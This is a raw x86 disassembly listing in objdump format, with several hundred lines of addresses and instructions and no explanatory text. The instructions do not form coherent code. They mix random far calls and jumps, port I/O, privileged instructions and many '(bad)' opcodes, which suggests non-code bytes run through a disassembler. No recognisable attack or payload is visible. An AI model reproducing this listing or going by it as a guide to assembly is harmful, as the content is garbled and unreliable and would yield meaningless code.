  415ccc:	scas   al,BYTE PTR es:[edi]
  415ccd:	xchg   edi,eax
  415cce:	loop   0x415c91
  415cd0:	cdq    
  415cd1:	stc    
  415cd2:	dec    eax
  415cd3:	sub    DWORD PTR [edi+0x9745132],eax
  415cd9:	hlt    
  415cda:	nop
  415cdb:	mov    ebp,0x4f2c0c14
  415ce0:	jno    0x415d3e
  415ce2:	add    BYTE PTR [eax],bl
  415ce4:	push   esi
  415ce5:	push   ds
  415ce6:	and    DWORD PTR [ebx],ebx
  415ce8:	or     al,BYTE PTR [ecx+0x54]
  415ceb:	cli    
  415cec:	inc    ebx
  415ced:	repz arpl WORD PTR [ebx+0x1da802d9],cx
  415cf4:	in     al,0x41
  415cf6:	test   al,0x1f
  415cf8:	pusha  
  415cf9:	cmp    DWORD PTR [ebx],ecx
  415cfb:	addr16 clc 
  415cfd:	aaa    
  415cfe:	js     0x415d7d
  415d00:	retf   
  415d01:	and    ebx,DWORD PTR [ecx]
  415d03:	xor    al,dl
  415d05:	or     ebp,DWORD PTR [edi-0x45]
  415d08:	jne    0x415cd8
  415d0a:	rcl    ch,0x59
  415d0d:	sub    esi,DWORD PTR [edx+edi*8+0x35]
  415d11:	lock cld 
  415d13:	push   edi
  415d14:	clc    
  415d15:	sbb    al,0xca
  415d17:	and    BYTE PTR [eax-0x2b],dh
  415d1a:	inc    ecx
  415d1b:	test   eax,0xee8b8f36
  415d20:	loop   0x415cb6
  415d22:	mov    ebp,ss
  415d24:	icebp  
  415d25:	inc    eax
  415d26:	cmp    ah,BYTE PTR [edi+eiz*1]
  415d29:	xor    BYTE PTR [ebx+esi*1+0x71],bh
  415d2d:	inc    esp
  415d2e:	sbb    eax,0xc1614390
  415d33:	test   DWORD PTR [edi],ecx
  415d35:	call   0x3a68:0xc28f0aa3
  415d3c:	fld    DWORD PTR [esi]
  415d3e:	inc    edx
  415d3f:	adc    dh,ch
  415d41:	cs dec esp
  415d43:	push   cs
  415d44:	mov    ds:0x50e59447,al
  415d49:	stos   BYTE PTR es:[edi],al
  415d4a:	push   es
  415d4b:	add    edi,DWORD PTR [ebx+ebx*2-0x74]
  415d4f:	mov    ds:0xf927b1a2,al
  415d54:	sbb    BYTE PTR [edi+0x17324009],dl
  415d5a:	add    ah,BYTE PTR [esi*1-0x1d075ad8]
  415d61:	dec    eax
  415d62:	into   
  415d63:	adc    eax,0x15c4154b
  415d68:	jae    0x415db8
  415d6a:	push   ds
  415d6b:	ja     0x415ddc
  415d6d:	stc    
  415d6e:	pushf  
  415d6f:	lds    ebp,FWORD PTR [edi+esi*2+0xe]
  415d73:	jbe    0x415db3
  415d75:	ins    DWORD PTR es:[edi],dx
  415d76:	sbb    dl,BYTE PTR [eax]
  415d78:	dec    eax
  415d79:	push   edx
  415d7a:	pushf  
  415d7b:	in     eax,dx
  415d7c:	push   esp
  415d7d:	shl    DWORD PTR [edi+0x1ef57a05],0xe
  415d84:	pcmpeqd mm5,mm5
  415d87:	ret    0xb7e7
  415d8a:	addr16 jno 0x415deb
  415d8d:	repnz stc 
  415d8f:	inc    edi
  415d90:	adc    al,BYTE PTR [edx-0x335bacd7]
  415d96:	nop
  415d97:	xlat   BYTE PTR ds:[ebx]
  415d98:	ins    DWORD PTR es:[edi],dx
  415d99:	mov    dl,0x30
  415d9b:	cmp    DWORD PTR [edi],ebp
  415d9d:	das    
  415d9e:	sbb    BYTE PTR [esi],ch
  415da0:	sub    eax,0x3c833e41
  415da5:	stos   BYTE PTR es:[edi],al
  415da6:	mov    ds:0x4b63be9e,al
  415dab:	lahf   
  415dac:	pop    es
  415dad:	add    al,BYTE PTR [edx-0x42]
  415db0:	shl    ah,1
  415db2:	adc    bh,BYTE PTR [ebx+esi*8-0x41312b2f]
  415db9:	lds    eax,FWORD PTR ds:0xc36de551
  415dbf:	fstp   DWORD PTR ds:0x9e2a9914
  415dc5:	mov    ebp,ebx
  415dc7:	push   ds
  415dc8:	mov    bl,BYTE PTR [esi+0x18625e47]
  415dce:	int    0x54
  415dd0:	pop    eax
  415dd1:	adc    edx,DWORD PTR [esi]
  415dd3:	jecxz  0x415d62
  415dd5:	inc    edx
  415dd6:	test   DWORD PTR [ecx+0x10],0xf38181b2
  415ddd:	add    al,0x50
  415ddf:	cs jae 0x415e22
  415de2:	lods   al,BYTE PTR ds:[esi]
  415de3:	jg     0x415e38
  415de5:	mov    ah,0xde
  415de7:	(bad)  
  415de8:	jg     0x415d97
  415dea:	mov    bh,0x5d
  415dec:	js     0x415dfe
  415dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415def:	mov    ds:0x69be5f6,eax
  415df4:	xlat   BYTE PTR ds:[ebx]
  415df5:	xchg   edi,eax
  415df6:	mov    al,ss:0x3b479e73
  415dfc:	pop    ss
  415dfd:	mov    edx,0xfb49d5db
  415e02:	jmp    0x5587:0x679eae92
  415e09:	jmp    0x31bf7693
  415e0e:	inc    bl
  415e10:	aad    0xa6
  415e12:	es cld 
  415e14:	sti    
  415e15:	mov    bh,0x38
  415e17:	mov    ebp,ss
  415e19:	mov    bh,BYTE PTR [esi+esi*2]
  415e1c:	and    ecx,DWORD PTR [eax-0xa0b5052]
  415e22:	inc    esp
  415e23:	clc    
  415e24:	call   0x4c7e:0x6b2bf70f
  415e2b:	xchg   ebp,eax
  415e2c:	adc    DWORD PTR ds:0x47743f18,0xa5f44141
  415e36:	pop    esi
  415e37:	add    bh,0xa7
  415e3a:	aas    
  415e3b:	adc    ch,BYTE PTR [esp+ebp*4-0x68f8498f]
  415e42:	loope  0x415e1d
  415e44:	jae    0x415ddc
  415e46:	out    0xe4,al
  415e48:	sbb    BYTE PTR [ebx-0xd],bh
  415e4b:	mov    ds:0xab072370,eax
  415e50:	ret    
  415e51:	sbb    edx,0x8a29a04a
  415e57:	call   0xfb39:0xf598454f
  415e5e:	dec    eax
  415e5f:	and    eax,0xf2d07bfe
  415e64:	fidivr DWORD PTR [edx-0x57b207cf]
  415e6a:	dec    esp
  415e6b:	(bad)  
  415e6c:	jb     0x415ed1
  415e6e:	ss in  al,dx
  415e70:	add    al,0x6e
  415e72:	das    
  415e73:	and    eax,0x952a1300
  415e78:	push   ss
  415e79:	mov    ah,0xda
  415e7b:	mov    ds:0x8edebfca,al
  415e80:	scas   eax,DWORD PTR es:[edi]
  415e81:	dec    ecx
  415e82:	ins    BYTE PTR es:[edi],dx
  415e83:	and    DWORD PTR [ebp+0x6766cdb0],esi
  415e89:	xor    BYTE PTR [esi-0x1b5e184a],bl
  415e8f:	xchg   BYTE PTR [eax+0x74],bh
  415e92:	sar    DWORD PTR [ecx-0x738d881],1
  415e98:	and    eax,0xa8e38078
  415e9d:	jp     0x415eec
  415e9f:	adc    BYTE PTR [eax-0x6c220b8a],0x7b
  415ea6:	test   BYTE PTR [ebx],dl
  415ea8:	and    dh,0x1c
  415eab:	and    dl,bh
  415ead:	dec    edx
  415eae:	fcmovne st,st(3)
  415eb0:	xchg   ecx,eax
  415eb1:	jns    0x415f0f
  415eb3:	xor    eax,0x3848edf9
  415eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb9:	jmp    0xbdb3:0x7cc61cb9
  415ec0:	lea    eax,[edx]
  415ec2:	sub    BYTE PTR [esi+0x4b],cl
  415ec5:	xor    DWORD PTR [bp+di-0x27],edi
  415ec9:	addr16 (bad) 
  415ecb:	jl     0x415e64
  415ecd:	(bad)  
  415ece:	pusha  
  415ecf:	pop    ebx
  415ed0:	dec    ecx
  415ed1:	stos   BYTE PTR es:[edi],al
  415ed2:	cmp    BYTE PTR [ebp-0x3b07e269],dh
  415ed8:	dec    ebx
  415ed9:	jecxz  0x415f3e
  415edb:	jbe    0x415e61
  415edd:	sbb    eax,DWORD PTR [esi+edx*1]
  415ee0:	jge    0x415ed8
  415ee2:	add    edi,ebp
  415ee4:	xor    al,0x2
  415ee6:	add    bh,BYTE PTR [esi+eax*1-0x59]
  415eea:	sub    ch,BYTE PTR [esi-0x5e5b13b]
  415ef0:	pop    eax
  415ef1:	push   esp
  415ef2:	xor    cl,ch
  415ef4:	xchg   edi,eax
  415ef5:	retf   0xa573
  415ef8:	(bad)  
  415ef9:	xor    eax,0x7ce8040c
  415efe:	fiadd  DWORD PTR [ebx]
  415f00:	push   ecx
  415f01:	mov    dl,0xeb
  415f03:	xchg   esi,eax
  415f04:	aas    
  415f05:	daa    
  415f06:	ss add ah,ch
  415f09:	or     al,0xd3
  415f0b:	loope  0x415f31
  415f0d:	outs   dx,BYTE PTR ds:[esi]
  415f0e:	das    
  415f0f:	retf   
  415f10:	adc    edi,DWORD PTR [ecx]
  415f12:	outs   dx,BYTE PTR ds:[esi]
  415f13:	mov    esi,DWORD PTR [ecx]
  415f15:	push   ds
  415f16:	inc    ebx
  415f17:	stos   DWORD PTR es:[di],eax
  415f19:	mov    eax,0x9530c5
  415f1e:	outs   dx,BYTE PTR ds:[esi]
  415f1f:	sub    DWORD PTR [esi+0x26],esi
  415f22:	or     edx,DWORD PTR [edx+0x32]
  415f25:	mov    gs,ecx
  415f27:	in     eax,0x5a
  415f29:	inc    esp
  415f2a:	dec    edx
  415f2b:	sbb    eax,edi
  415f2d:	push   edx
  415f2e:	sbb    di,WORD PTR [ecx+eax*4-0x3a]
  415f33:	rol    DWORD PTR [ebp-0x421dd55c],0xbb
  415f3a:	shr    dl,1
  415f3c:	push   0x841d9ac1
  415f41:	jb     0x415fbf
  415f43:	jne    0x415f88
  415f45:	ret    0x6cf0
  415f48:	inc    ecx
  415f49:	outs   dx,DWORD PTR ds:[esi]
  415f4a:	mov    ebp,0x40586f1b
  415f4f:	dec    esp
  415f50:	jne    0x415ef5
  415f52:	push   cs
  415f53:	mov    eax,0xfc750880
  415f58:	dec    ebx
  415f59:	call   0x968e:0xc43759ce
  415f60:	fisubr WORD PTR [ebx-0x501f5ec0]
  415f66:	rcl    BYTE PTR [esp+edx*4-0x21971725],0x39
  415f6e:	pop    ss
  415f6f:	test   eax,0x13b61cde
  415f74:	mov    ah,ah
  415f76:	jns    0x415f5d
  415f78:	fistp  WORD PTR [ebp+0x5f]
  415f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f7c:	and    al,0x7c
  415f7e:	mov    BYTE PTR [ecx],bh
  415f80:	add    eax,0x4e2533cd
  415f85:	dec    ecx
  415f86:	leave  
  415f87:	stc    
  415f88:	in     al,dx
  415f89:	jo     0x416000
  415f8b:	mov    cs,edi
  415f8d:	repnz cmp eax,0x13e962e2
  415f93:	sub    ecx,DWORD PTR [edi+edi*2+0x20feb59a]
  415f9a:	lods   ax,WORD PTR ds:[esi]
  415f9c:	out    dx,eax
  415f9d:	arpl   WORD PTR ds:0x341c9ddb,cx
  415fa3:	mov    esi,0x457cee39
  415fa8:	xor    eax,DWORD PTR [ebp-0x6]
  415fab:	out    0x23,eax
  415fad:	mov    al,0xf2
  415faf:	mov    ah,0x5a
  415fb1:	jp     0x41601c
  415fb3:	cmp    BYTE PTR [eax+0x6c],bh
  415fb6:	fcmovbe st,st(5)
  415fb8:	repnz pop ss
  415fba:	loopne 0x415f46
  415fbc:	out    dx,al
  415fbd:	test   DWORD PTR [ebx+edx*1-0x2210f24c],esi
  415fc4:	mov    eax,0xd9464fd9
  415fc9:	xchg   ebx,eax
  415fca:	in     al,0x38
  415fcc:	stos   BYTE PTR es:[edi],al
  415fcd:	(bad)  
  415fce:	imul   eax,DWORD PTR ds:0x94ae1c9d,0xffffffa4
  415fd5:	mov    fs,WORD PTR ds:0x86ab80b8
  415fdb:	rol    ebx,0xbb
  415fde:	jmp    0xcf75:0xcc039548
  415fe5:	push   edi
  415fe6:	cmp    eax,0xbc470c8b
  415feb:	or     DWORD PTR [eax],ebx
  415fed:	xchg   esp,eax
  415fee:	shl    DWORD PTR [eax-0x152daac7],0x3a
  415ff5:	sbb    ecx,DWORD PTR [esi+0x4b5284c5]
  415ffb:	fnstsw WORD PTR [esi*2-0x737b4d83]
  416002:	(bad)  
  416003:	gs mov ah,0x4e
  416006:	enter  0xf3d6,0xc7
  41600a:	rcl    BYTE PTR [eax+0x6e],1
  41600d:	retf   
  41600e:	inc    ecx
  41600f:	pop    ds
  416010:	pushf  
  416011:	xor    dh,bh
  416013:	clc    
  416014:	dec    ebp
  416015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416016:	push   0x5a
  416018:	push   eax
  416019:	xor    BYTE PTR [ebx],cl
  41601b:	call   0xabc6:0x98cb8e44
  416022:	(bad)  
  416023:	or     eax,0x605fa5b6
  416028:	push   eax
  416029:	out    0x43,al
  41602b:	call   0xe9a6:0x31d505d4
  416032:	retf   0xd696
  416035:	cmp    DWORD PTR [ecx-0x1b],0x1c
  416039:	adc    edi,DWORD PTR [eax+0x57]
  41603c:	adc    eax,0x1c51be03
  416041:	cwde   
  416042:	pop    edx
  416043:	and    DWORD PTR [esi],esi
  416045:	mov    dh,0x14
  416047:	jecxz  0x41609b
  416049:	xchg   DWORD PTR [eax+0x4c9bed03],ebp
  41604f:	xchg   DWORD PTR [esi-0x5f],eax
  416052:	mov    WORD PTR [edi+0x7f],cs
  416055:	push   edx
  416056:	lods   eax,DWORD PTR ds:[esi]
  416057:	fwait
  416058:	push   DWORD PTR [edi+0x5f]
  41605b:	lods   al,BYTE PTR ds:[esi]
  41605c:	mov    BYTE PTR ss:[esi+esi*8],0xd0
  416061:	adc    BYTE PTR [ecx+eiz*2+0x49779b8c],al
  416068:	jge    0x41602d
  41606a:	mov    edx,DWORD PTR [ebx+0x2f]
  41606d:	cmc    
  41606e:	adc    eax,DWORD PTR es:[esi+0x260b3587]
  416075:	jecxz  0x416027
  416077:	mov    ebx,edi
  416079:	call   0x50aaef31
  41607e:	test   eax,0xabceb99
  416083:	mov    edi,0x8ba5035b
  416088:	fs sbb bh,dh
  41608b:	cwde   
  41608c:	jmp    0x662d7291
  416091:	lahf   
  416092:	adc    DWORD PTR [esi],ebx
  416094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416095:	mov    cl,0x47
  416097:	jo     0x4160b1
  416099:	dec    esi
  41609a:	jae    0x41605a
  41609c:	bound  ebx,QWORD PTR [ebx-0x6c]
  41609f:	sbb    DWORD PTR [edi+0x328d6966],0x70a9b082
  4160a9:	push   edi
  4160aa:	xor    ebp,DWORD PTR [edi-0x79be508]
  4160b0:	xor    bl,bl
  4160b2:	xor    ebp,ebx
  4160b4:	xor    bh,BYTE PTR [esi+0x7b]
  4160b7:	add    bh,BYTE PTR ss:[ecx-0x3b]
  4160bb:	out    0x7c,eax
  4160bd:	mov    cl,0xe2
  4160bf:	mov    dl,0x59
  4160c1:	push   esi
  4160c2:	nop
  4160c3:	out    dx,eax
  4160c4:	sub    BYTE PTR [esi+0x23a969b6],al
  4160ca:	mov    eax,0xecd421af
  4160cf:	ds aas 
  4160d1:	fistp  WORD PTR [edi+0x12c604ff]
  4160d7:	clc    
  4160d8:	push   ebp
  4160d9:	mov    dh,0xf9
  4160db:	enter  0x38c1,0x92
  4160df:	inc    ecx
  4160e0:	push   ebp
  4160e1:	xor    al,0xbb
  4160e3:	inc    edx
  4160e4:	and    al,0xee
  4160e6:	jbe    0x41615b
  4160e8:	sub    BYTE PTR [edx+0x24],0x80
  4160ec:	mov    DWORD PTR [ecx+0x5c],edi
  4160ef:	and    al,0xfd
  4160f1:	js     0x41615d
  4160f3:	jecxz  0x4160ae
  4160f5:	cmovnp ebp,DWORD PTR [edi+0x4f]
  4160f9:	mov    ch,0x2b
  4160fb:	inc    edi
  4160fc:	mov    esi,0x6be08d1e
  416101:	nop
  416102:	shr    BYTE PTR [edx+0x44ac1d0d],1
  416108:	and    DWORD PTR [edi+0x70],edx
  41610b:	xchg   DWORD PTR [eax-0x4f],ecx
  41610e:	dec    eax
  41610f:	xchg   ebx,eax
  416110:	lods   eax,DWORD PTR ds:[esi]
  416111:	adc    ebx,ebp
  416113:	mov    ebp,0x17e8715
  416118:	rcr    BYTE PTR [esi],0x6e
  41611b:	repnz aam 0x4b
  41611e:	xor    BYTE PTR [ebp-0x27],bh
  416121:	int    0x30
  416123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416124:	(bad)  
  416125:	fild   QWORD PTR [ebp-0x373df90]
  41612b:	(bad)  
  41612c:	hlt    
  41612d:	pop    eax
  41612e:	mov    WORD PTR [edi-0x6],cs
  416131:	pop    ebp
  416132:	add    BYTE PTR [ecx+0x407db881],bh
  416138:	pop    ebx
  416139:	ds fwait
  41613b:	je     0x4161ab
  41613d:	jl     0x4160f2
  41613f:	sbb    DWORD PTR [edi+0x345c71d3],ebp
  416145:	jne    0x416114
  416147:	push   edi
  416148:	jnp    0x416129
  41614a:	mov    DWORD PTR [edi-0x50dd9ab9],edx
  416150:	(bad)  
  416152:	inc    cl
  416154:	mov    ebx,DWORD PTR [ebx-0x53]
  416157:	xchg   BYTE PTR [eax],ah
  416159:	repnz adc ebx,DWORD PTR [ebx+eiz*1+0x5f41405b]
  416161:	push   edx
  416162:	iret   
  416163:	jg     0x4160ef
  416165:	int    0x78
  416167:	adc    dl,BYTE PTR [eax+0x6bf9d7b3]
  41616d:	hlt    
  41616e:	push   esi
  41616f:	pusha  
  416170:	sub    BYTE PTR [edi],bl
  416172:	test   eax,0x9c7f519b
  416177:	adc    al,0x53
  416179:	push   cs
  41617a:	inc    ebp
  41617b:	shl    DWORD PTR [ebx],0x20
  41617e:	setno  BYTE PTR [eax-0x4c]
  416182:	pop    ecx
  416183:	add    eax,0xbf1bf4bd
  416188:	mov    ch,BYTE PTR [esi+0x5d3355be]
  41618e:	imul   edi
  416190:	loopne 0x4161e0
  416192:	adc    ah,dh
  416194:	mov    eax,ds:0xf93cfbed
  416199:	aas    
  41619a:	hlt    
  41619b:	leave  
  41619c:	jb     0x416139
  41619e:	mov    edi,0x8ef10095
  4161a3:	xchg   ebp,eax
  4161a4:	adc    eax,DWORD PTR [ebp-0x2]
  4161a7:	cmp    eax,0x89891a72
  4161ac:	aam    0x5
  4161ae:	ror    BYTE PTR [esi+0x65],1
  4161b1:	repz fld DWORD PTR [ecx]
  4161b4:	(bad)  
  4161b5:	aam    0xa
  4161b7:	jp     0x4161b0
  4161b9:	pop    edi
  4161ba:	mov    WORD PTR [ebx],ds
  4161bc:	pusha  
  4161bd:	loope  0x416180
  4161bf:	mov    al,0xbb
  4161c1:	es in  eax,dx
  4161c3:	icebp  
  4161c4:	rcl    BYTE PTR [ebp+edx*8+0x7b3dbf4b],cl
  4161cb:	pop    DWORD PTR [ebx]
  4161cd:	(bad)  
  4161ce:	xor    DWORD PTR [edi+0x675cbcd],edi
  4161d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161d5:	mov    ecx,0xa5fad80e
  4161da:	aad    0x8b
  4161dc:	arpl   WORD PTR [eax+0x73],di
  4161df:	mov    ds:0x1961b28,al
  4161e4:	cdq    
  4161e5:	stc    
  4161e6:	or     al,0x15
  4161e8:	xor    eax,0xc2c1c4be
  4161ed:	pop    ds
  4161ee:	and    bh,BYTE PTR [edx-0x67]
  4161f1:	cmp    DWORD PTR [ebx+0x3a4398cb],0x33
  4161f8:	ja     0x416227
  4161fa:	dec    eax
  4161fb:	add    DWORD PTR [ebp+edx*4-0x5adf2ed0],ecx
  416202:	xchg   ebp,eax
  416203:	out    dx,eax
  416204:	sub    DWORD PTR [esi-0x5b],0x66
  416208:	bswap  ecx
  41620a:	rcl    esp,1
  41620c:	sub    BYTE PTR ss:[ebx-0x751ccaaf],ch
  416213:	mov    eax,ds:0x2120477a
  416218:	cmp    DWORD PTR [eax],edi
  41621a:	ret    
  41621b:	inc    eax
  41621c:	out    0xc2,eax
  41621e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41621f:	dec    edx
  416220:	sbb    bh,ch
  416222:	push   edx
  416223:	pop    esp
  416224:	mov    al,es:0x388a1845
  41622a:	xchg   BYTE PTR [ecx],bh
  41622c:	inc    ebp
  41622d:	cmp    BYTE PTR [eax+0x58],dh
  416230:	jg     0x4161f6
  416232:	push   esi
  416233:	dec    esi
  416234:	jg     0x416283
  416236:	into   
  416237:	push   esp
  416238:	jl     0x4162b5
  41623a:	mov    eax,ds:0xcc7ba2c6
  41623f:	xchg   esp,eax
  416240:	lea    esp,[edx+0x4a]
  416243:	adc    BYTE PTR [esp+esi*1+0x55],ah
  416247:	out    dx,eax
  416248:	jp     0x416281
  41624a:	inc    ebx
  41624b:	test   DWORD PTR [ecx],ecx
  41624d:	push   0x57401b88
  416252:	dec    edi
  416253:	lock xchg esp,eax
  416255:	add    eax,DWORD PTR [edx+0x44d93abf]
  41625b:	fimul  WORD PTR [eax]
  41625d:	push   ecx
  41625e:	dec    edx
  41625f:	mov    ch,0xe1
  416261:	out    0x9b,eax
  416263:	ficom  DWORD PTR [edx+0x7]
  416266:	add    BYTE PTR [edx-0x269454fe],cl
  41626c:	xchg   ebx,eax
  41626d:	and    ebp,DWORD PTR [esi+0x77]
  416270:	daa    
  416271:	mov    dh,bl
  416273:	repz or al,0xf9
  416276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416277:	sbb    al,bl
  416279:	mov    edx,0xb6f960eb
  41627e:	(bad)  
  41627f:	lock sub BYTE PTR [eax],ch
  416282:	test   eax,0xfe267b22
  416287:	loop   0x41620c
  416289:	test   al,0x47
  41628b:	repz mov bh,0x74
  41628e:	(bad)  
  41628f:	adc    ch,dl
  416291:	cmp    cl,dl
  416293:	pop    esp
  416294:	cwde   
  416295:	push   ecx
  416296:	mov    dl,0xa8
  416298:	xchg   ecx,eax
  416299:	out    dx,al
  41629a:	call   0x26727e74
  41629f:	in     eax,dx
  4162a0:	mov    al,ds:0x1b5bffa3
  4162a5:	(bad)  
  4162a6:	ficomp WORD PTR [ebx+edx*2]
  4162a9:	cmp    cl,BYTE PTR [ecx-0x3b732d2c]
  4162af:	inc    edi
  4162b0:	mov    cl,0x1b
  4162b2:	pop    ds
  4162b3:	arpl   WORD PTR [ecx-0x33],si
  4162b6:	sti    
  4162b7:	inc    ebp
  4162b8:	dec    eax
  4162b9:	sbb    ebx,ecx
  4162bb:	fbld   TBYTE PTR [edx+0x4969432b]
  4162c1:	xchg   ebx,eax
  4162c2:	sub    al,0xed
  4162c4:	push   0x5dba3399
  4162c9:	add    al,0xd
  4162cb:	mov    cl,0xba
  4162cd:	pop    ebx
  4162ce:	push   ds
  4162cf:	pusha  
  4162d0:	ins    BYTE PTR es:[edi],dx
  4162d1:	mov    ebp,0xf37f6f95
  4162d6:	or     al,0xac
  4162d8:	fstp   DWORD PTR [esi-0x5]
  4162db:	imul   ebx,DWORD PTR [edx],0x2c
  4162de:	and    ch,BYTE PTR [ecx-0x6d]
  4162e1:	loope  0x4162c3
  4162e3:	pop    ebp
  4162e4:	pop    esi
  4162e5:	popf   
  4162e6:	loop   0x41631b
  4162e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e9:	scas   al,BYTE PTR es:[edi]
  4162ea:	cmp    eax,0x1703f808
  4162ef:	push   esi
  4162f0:	fstp   TBYTE PTR [ebx+eax*4-0x22]
  4162f4:	(bad)  
  4162f5:	lock mov ecx,0x78c10d5f
  4162fb:	scas   eax,DWORD PTR es:[edi]
  4162fc:	and    DWORD PTR [ebp-0x37f532e1],esp
  416302:	outs   dx,DWORD PTR cs:[esi]
  416304:	aad    0x6c
  416306:	int    0x49
  416308:	repnz push ecx
  41630a:	jnp    0x416291
  41630c:	imul   ebx,DWORD PTR [edx-0x75],0x4a
  416310:	cmc    
  416311:	pusha  
  416312:	pop    ds
  416313:	mov    dl,0x26
  416315:	jge    0x4162a7
  416317:	fsubp  st(3),st
  416319:	jnp    0x41635a
  41631b:	lods   al,BYTE PTR ds:[esi]
  41631c:	mov    dl,0x7c
  41631e:	sbb    esp,esp
  416320:	push   ebp
  416321:	sbb    DWORD PTR [ebx],0xa5e0f29f
  416327:	adc    ebx,DWORD PTR [esi+0x4e6b8420]
  41632d:	dec    esi
  41632e:	popa   
  41632f:	test   al,0xe0
  416331:	paddb  mm0,QWORD PTR [edi+0x77]
  416335:	(bad)  [esi]
  416337:	sub    dh,bh
  416339:	sbb    al,0x3e
  41633b:	pop    esi
  41633c:	dec    edx
  41633d:	pushf  
  41633e:	call   0xdb84:0x2e05d1dc
  416345:	cmp    ebx,DWORD PTR [esi]
  416347:	(bad)  
  416348:	fidivr WORD PTR [ebp+ecx*8+0x2bb8a859]
  41634f:	ins    DWORD PTR es:[edi],dx
  416350:	shr    DWORD PTR [edi],1
  416352:	sti    
  416353:	pop    edi
  416354:	xor    BYTE PTR [esi-0x282088fd],0xa2
  41635b:	adc    eax,0x4f979736
  416360:	js     0x416395
  416362:	dec    ecx
  416363:	jno    0x4163cc
  416365:	jecxz  0x4162e7
  416367:	mov    ah,0x8
  416369:	call   0x5fd46c1
  41636e:	cdq    
  41636f:	or     edx,ebx
  416371:	aaa    
  416372:	fisubr WORD PTR [ebx]
  416374:	mov    eax,0x187d9814
  416379:	mov    bl,0x54
  41637b:	imul   esi,ebx,0x13f7b278
  416381:	jp     0x41635e
  416383:	cs (bad) 
  416385:	in     al,dx
  416386:	jno    0x4163cc
  416388:	test   eax,0xa5a85407
  41638d:	jbe    0x41632a
  41638f:	jp     0x416355
  416391:	les    esp,FWORD PTR [ebx-0x44]
  416394:	je     0x416382
  416396:	xor    BYTE PTR [eax-0x29397ec],ah
  41639c:	or     al,0xb
  41639e:	jno    0x416356
  4163a0:	push   ebp
  4163a1:	shl    eax,0x3d
  4163a4:	js     0x4163ad
  4163a6:	xchg   DWORD PTR [esp+eiz*8],edx
  4163a9:	jo     0x41640b
  4163ab:	retf   
  4163ac:	mov    ss,WORD PTR [ebx]
  4163ae:	mov    ecx,0x87555a0e
  4163b3:	and    DWORD PTR [ecx],esp
  4163b5:	mov    BYTE PTR [esi],bl
  4163b7:	(bad)  
  4163b9:	sbb    dh,BYTE PTR [edi-0xd]
  4163bc:	cdq    
  4163bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163be:	sbb    BYTE PTR [esi+esi*2-0x3],cl
  4163c2:	push   ebp
  4163c3:	jmp    0x30c4:0x553ad125
  4163ca:	loop   0x416373
  4163cc:	or     eax,0x3d219d10
  4163d1:	cwde   
  4163d2:	stc    
  4163d3:	inc    edi
  4163d4:	cwde   
  4163d5:	cmp    DWORD PTR [esi+0x12],0x56
  4163d9:	add    dl,BYTE PTR [ecx+eiz*4+0x4f37ad7c]
  4163e0:	or     BYTE PTR [edi],dl
  4163e2:	jge    0x41645d
  4163e4:	sbb    edi,DWORD PTR [edx+0x4e092237]
  4163ea:	sub    DWORD PTR [esi+0x79],edi
  4163ed:	mov    ah,0x1b
  4163ef:	mov    ds:0xcdfa3d4f,eax
  4163f4:	dec    edi
  4163f5:	loopne 0x4163f2
  4163f7:	lods   al,BYTE PTR ds:[esi]
  4163f8:	xlat   BYTE PTR ds:[ebx]
  4163f9:	hlt    
  4163fa:	rol    BYTE PTR [edx-0x7384dedb],0xa4
  416401:	(bad)  
  416402:	shl    DWORD PTR [esi+0x7143ab2a],cl
  416408:	sub    al,0xb2
  41640a:	mov    ecx,0x9d1f60aa
  41640f:	mov    ds:0x601319f0,al
  416414:	push   0xf
  416416:	fcmovnu st,st(1)
  416418:	push   esi
  416419:	cmp    al,0x4
  41641b:	(bad)  
  41641c:	mov    edi,0xa4c408aa
  416421:	mov    DWORD PTR [ebx-0x34],ebx
  416424:	jecxz  0x4163af
  416426:	fisub  WORD PTR [ebx-0x57748f26]
  41642c:	xlat   BYTE PTR ds:[ebx]
  41642d:	mov    dh,0xc9
  41642f:	into   
  416430:	jae    0x4163fa
  416432:	sub    cl,BYTE PTR ds:0x7dfa9e7c
  416438:	cwde   
  416439:	jg     0x416428
  41643b:	pop    ecx
  41643c:	sti    
  41643d:	push   ds
  41643e:	pop    edx
  41643f:	iret   
  416440:	sub    al,0xf4
  416442:	shl    DWORD PTR [eax+0x3a8ed4df],1
  416448:	inc    ebx
  416449:	fdivr  QWORD PTR [esp+ecx*2+0x53]
  41644d:	(bad)  
  41644e:	inc    edx
  41644f:	mov    BYTE PTR [ecx+0x65],ch
  416452:	mov    esp,0x3d7ee1be
  416457:	mov    BYTE PTR [edx+0x1],0x8d
  41645b:	in     eax,0x7e
  41645d:	pop    ds
  41645e:	inc    ebp
  41645f:	jne    0x4164c8
  416461:	ret    0xdc50
  416464:	pop    esi
  416465:	xchg   ebp,eax
  416466:	push   0x2eb90bf2
  41646b:	js     0x416469
  41646d:	mov    eax,ds:0xd95b1361
  416472:	pop    eax
  416473:	and    al,0x86
  416475:	test   BYTE PTR [edi-0x584052f0],bh
  41647b:	test   DWORD PTR [esi-0x1ec3579],ecx
  416481:	adc    ch,al
  416483:	push   eax
  416484:	or     esp,DWORD PTR [ebx-0x5e56b8a3]
  41648a:	in     eax,dx
  41648b:	cmp    eax,0xf746faad
  416490:	push   ss
  416491:	call   FWORD PTR [ebx-0x1247ac5c]
  416497:	lods   eax,DWORD PTR ds:[esi]
  416498:	sub    al,0x7e
  41649a:	outs   dx,DWORD PTR ds:[esi]
  41649b:	imul   ebp,DWORD PTR [ebx+0x7a8b8105],0x16
  4164a2:	mov    ds:0xb5a73318,al
  4164a7:	lahf   
  4164a8:	enter  0xb510,0xc7
  4164ac:	mov    esp,0x60dc5fcc
  4164b1:	mov    ecx,DWORD PTR [ebx+eax*4]
  4164b4:	mov    gs,ecx
  4164b6:	dec    ebp
  4164b7:	ins    DWORD PTR es:[edi],dx
  4164b8:	call   0xe72f209f
  4164bd:	dec    eax
